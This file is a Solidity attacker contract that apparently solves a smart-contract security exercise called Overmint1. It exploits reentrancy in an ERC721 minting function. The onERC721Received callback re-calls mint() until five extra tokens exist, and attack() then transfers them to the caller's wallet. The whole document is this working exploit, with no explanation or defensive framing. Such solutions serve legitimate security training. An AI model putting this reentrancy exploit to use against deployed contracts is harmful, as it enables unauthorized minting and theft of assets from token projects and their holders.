// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "./Overmint1.sol";

contract Overmint1Attacker is IERC721Receiver {
    Overmint1 public victim;
    uint256 public count;

    constructor(address _victim) {
        victim = Overmint1(_victim);
    }

    function attack() external {
        victim.mint();

        address attackerWallet = msg.sender;
        for (uint256 i = 1; i <= 5; i++) {
            IERC721(address(victim)).transferFrom(address(this), attackerWallet, i);
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        require(msg.sender == address(victim), "only victim");
        if (count < 5) {
            count++;
            victim.mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
